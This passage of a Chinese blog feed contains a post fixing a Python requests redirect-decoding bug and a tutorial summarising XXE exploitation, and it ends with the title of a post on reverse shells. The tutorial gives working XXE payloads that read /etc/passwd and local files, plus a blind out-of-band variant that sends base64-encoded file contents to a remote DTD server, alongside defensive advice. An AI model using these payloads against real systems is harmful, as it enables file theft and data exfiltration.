      <content type="html"><![CDATA[<blockquote class="blockquote-center">得之坦然，失之淡然，顺其自然，争其必然</blockquote><blockquote><p>fix一个requests redirect bug</p></blockquote><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在我请求某个链接的时候，requests抛出了如下异常（我是python3环境）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\IPython\core\interactiveshell.py"</span>, line <span class="number">2910</span>, <span class="keyword">in</span> run_code</span><br><span class="line">    exec(code_obj, self.user_global_ns, self.user_ns)</span><br><span class="line">  File <span class="string">"&lt;ipython-input-8-36f4e5f02f7e&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    resp = requests.get(<span class="string">'http://xxx.com/xxx'</span>)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\api.py"</span>, line <span class="number">72</span>, <span class="keyword">in</span> get</span><br><span class="line">    <span class="keyword">return</span> request(<span class="string">'get'</span>, url, params=params, **kwargs)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\api.py"</span>, line <span class="number">58</span>, <span class="keyword">in</span> request</span><br><span class="line">    <span class="keyword">return</span> session.request(method=method, url=url, **kwargs)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">512</span>, <span class="keyword">in</span> request</span><br><span class="line">    resp = self.send(prep, **send_kwargs)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">644</span>, <span class="keyword">in</span> send</span><br><span class="line">    history = [resp <span class="keyword">for</span> resp <span class="keyword">in</span> gen] <span class="keyword">if</span> allow_redirects <span class="keyword">else</span> []</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">644</span>, <span class="keyword">in</span> &lt;listcomp&gt;</span><br><span class="line">    history = [resp <span class="keyword">for</span> resp <span class="keyword">in</span> gen] <span class="keyword">if</span> allow_redirects <span class="keyword">else</span> []</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">124</span>, <span class="keyword">in</span> resolve_redirects</span><br><span class="line">    url = self.get_redirect_target(resp)</span><br><span class="line">    File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">115</span>, <span class="keyword">in</span> get_redirect_target</span><br><span class="line">    <span class="keyword">return</span> to_native_string(location, <span class="string">'utf8'</span>)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\_internal_utils.py"</span>, line <span class="number">25</span>, <span class="keyword">in</span> to_native_string</span><br><span class="line">    out = string.decode(encoding)</span><br><span class="line">UnicodeDecodeError: <span class="string">'utf-8'</span> codec can<span class="string">'t decode byte 0xc7 in position 45: invalid continuation byte</span></span><br></pre></td></tr></table></figure></p><p>看错误信息应该是重定向了，并且requests无法正常解码location字段</p><p>通过抓包看请求，发现重定向链接含有非ascii字符:</p><p><img src="../images/requests-redirect-bug/1.png" alt=""></p><p>可以看到含有非ascii字符，且编码是gbk</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>根据上面报错信息，查看requests\sessions.py的get_redirect_target函数的解码部分和：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> resp.is_redirect:</span><br><span class="line">    location = resp.headers[<span class="string">'location'</span>]</span><br><span class="line">    <span class="comment"># Currently the underlying http module on py3 decode headers</span></span><br><span class="line">    <span class="comment"># in latin1, but empirical evidence suggests that latin1 is very</span></span><br><span class="line">    <span class="comment"># rarely used with non-ASCII characters in HTTP headers.</span></span><br><span class="line">    <span class="comment"># It is more likely to get UTF8 header rather than latin1.</span></span><br><span class="line">    <span class="comment"># This causes incorrect handling of UTF8 encoded location headers.</span></span><br><span class="line">    <span class="comment"># To solve this, we re-encode the location in latin1.</span></span><br><span class="line">    <span class="keyword">if</span> is_py3:</span><br><span class="line">        location = location.encode(<span class="string">'latin1'</span>)</span><br><span class="line">    <span class="keyword">return</span> to_native_string(location, <span class="string">'utf8'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure><p>如果是python3，那么先使用latin1加密一次，接着调用了to_native_string，默认的就是’utf-8’，而最终的错误回溯也是在这里：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> isinstance(string, builtin_str):</span><br><span class="line">    out = string</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> is_py2:</span><br><span class="line">        out = string.encode(encoding)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out = string.decode(encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><p>如果是python3，会解码，encoding就是’utf-8’。</p><p>但是我的重定向链接编码不是utf-8而是gbk，所以无法正常解码。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>我的解决办法是对session的get_redirect_target方法做了patch：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests._internal_utils <span class="keyword">import</span> to_native_string</span><br><span class="line"><span class="keyword">from</span> requests.compat <span class="keyword">import</span> is_py3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_redirect_target</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">    <span class="string">"""hook requests.Session.get_redirect_target method"""</span></span><br><span class="line">    <span class="keyword">if</span> resp.is_redirect:</span><br><span class="line">        location = resp.headers[<span class="string">'location'</span>]</span><br><span class="line">        <span class="keyword">if</span> is_py3:</span><br><span class="line">            location = location.encode(<span class="string">'latin1'</span>)</span><br><span class="line">        encoding = resp.encoding <span class="keyword">if</span> resp.encoding <span class="keyword">else</span> <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> to_native_string(location, encoding)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">()</span>:</span></span><br><span class="line">    requests.Session.get_redirect_target = get_redirect_target</span><br></pre></td></tr></table></figure><p>其他地方需要patch的，直接在使用requests请求之前调用patch方法就行了</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>xxe漏洞利用总结</title>
      <link href="/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">今天很残酷,明天也一样,后天也许还是一样,但你不得不经过明天后天</blockquote><blockquote><p>最近遇到了关于xxe相关漏洞，于是想做个总结，方便以后查阅。</p></blockquote><a id="more"></a><h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选,可选是因为类型定义是加强约束,对于漏洞利用来说可以不定义）、文档元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p><p>内部声明DTD:<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>引用外部DTD:<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>DTD文档中有很多重要的关键字如下:</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)<br>实体根据引用方式，还可分为内部实体与外部实体。<br>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></li></ul><h4 id="实体类别"><a href="#实体类别" class="headerlink" title="实体类别"></a>实体类别</h4><p>内部实体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>参数实体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>参数实体用<code>% 实体名称</code>申明，引用时也用<code>% 实体名称</code>;其余实体直接用<code>实体名</code>称申明，引用时用<code>&amp; 实体名称</code>。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>内部实体：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name "longofo"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>php测试：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY name "longofo"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;</span></span><br><span class="line"><span class="string">        &lt;value&gt;&amp;name;&lt;/value&gt; </span></span><br><span class="line"><span class="string">&lt;/foo&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。</span></span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">    var_dump($doc);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $doc-&gt;vaule;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/xxe漏洞利用总结1.png" alt="/images/xxe漏洞利用总结1.png"></p><p>外部实体：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>php测试：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY name SYSTEM "file:///C:/Users/dell/Desktop/xxe.txt"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;</span></span><br><span class="line"><span class="string">    &lt;value&gt;&amp;name;&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/foo&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。</span></span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">    var_dump($doc);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $doc-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/xxe漏洞利用总结2.png" alt="/images/xxe漏洞利用总结2.png"></p><p>参数实体：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "http://127.0.0.1:8088/Desktop/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">vaule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>xxe.dtd内容：<br><img src="/images/xxe漏洞利用总结3.png" alt="/images/xxe漏洞利用总结3.png"><br>为了进行测试可以简单使用python启动一个服务器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8088</span></span><br></pre></td></tr></table></figure></p><p>php测试：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY % file SYSTEM "http://10.1.8.35:8088/Desktop/xxe.dtd"&gt;</span></span><br><span class="line"><span class="string">    %file;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;</span></span><br><span class="line"><span class="string">    &lt;value&gt;&amp;name;&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/foo&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。</span></span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">    var_dump($doc);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $doc-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/xxe漏洞利用总结4.png" alt="/images/xxe漏洞利用总结4.png"></p><p><em>注意</em>：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><h2 id="外部实体支持的协议类型"><a href="#外部实体支持的协议类型" class="headerlink" title="外部实体支持的协议类型"></a>外部实体支持的协议类型</h2><p>外部实体即在DTD中使用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure></p><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，不同的程序支持的不一样：</p><table><thead><tr><th style="text-align:left">libxml2</th><th style="text-align:left">PHP</th><th style="text-align:left">JAVA</th><th style="text-align:left">.NET</th></tr></thead><tbody><tr><td style="text-align:left">file</td><td style="text-align:left">file</td><td style="text-align:left">http</td><td style="text-align:left">file</td></tr><tr><td style="text-align:left">http</td><td style="text-align:left">http</td><td style="text-align:left">https</td><td style="text-align:left">http</td></tr><tr><td style="text-align:left">ftp</td><td style="text-align:left">ftp</td><td style="text-align:left">ftp</td><td style="text-align:left">https</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">php</td><td style="text-align:left">file</td><td style="text-align:left">ftp</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">compress.zlib</td><td style="text-align:left">jar</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">compress.bzip2</td><td style="text-align:left">netdoc</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">data</td><td style="text-align:left">mailto</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">glob</td><td style="text-align:left">gopher *</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">phar</td><td style="text-align:left">http</td><td style="text-align:left"></td></tr></tbody></table><h2 id="xxe漏洞利用与防范"><a href="#xxe漏洞利用与防范" class="headerlink" title="xxe漏洞利用与防范"></a>xxe漏洞利用与防范</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>利用方式和上面的演示类似</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/Users/dell/Desktop/xxe.txt"&gt;</span></span><br><span class="line"><span class="string">    &lt;!ENTITY % dtd SYSTEM "http://10.1.8.35:8088/Desktop/xxe.dtd"&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>xxe.dtd内容：<br><img src="/images/xxe漏洞利用总结5.png" alt="/images/xxe漏洞利用总结5.png"><br>为了测试成功，可以使用python开启一个http服务器<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8088</span></span><br></pre></td></tr></table></figure></p><p>服务器请求log：<br><img src="/images/xxe漏洞利用总结6.png" alt="/images/xxe漏洞利用总结6.png"></p><p><em>注</em>：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍了</p><h3 id="xxe可以用来做什么？"><a href="#xxe可以用来做什么？" class="headerlink" title="xxe可以用来做什么？"></a>xxe可以用来做什么？</h3><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h3 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h3><h4 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h4><p>PHP：<br>libxml_disable_entity_loader(true);</p><p>其他语言:<br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></p><h4 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h4><p>关键词：SYSTEM和PUBLIC等。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></li><li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf</a></li><li><a href="https://www.youtube.com/watch?v=j2cfebNEfic" target="_blank" rel="noopener">https://www.youtube.com/watch?v=j2cfebNEfic</a></li></ul>]]></content>
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>frp实现内网穿透-内网kali接收反弹shell</title>
      <link href="/frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-%E5%86%85%E7%BD%91kali%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%BC%B9shell.html"/>
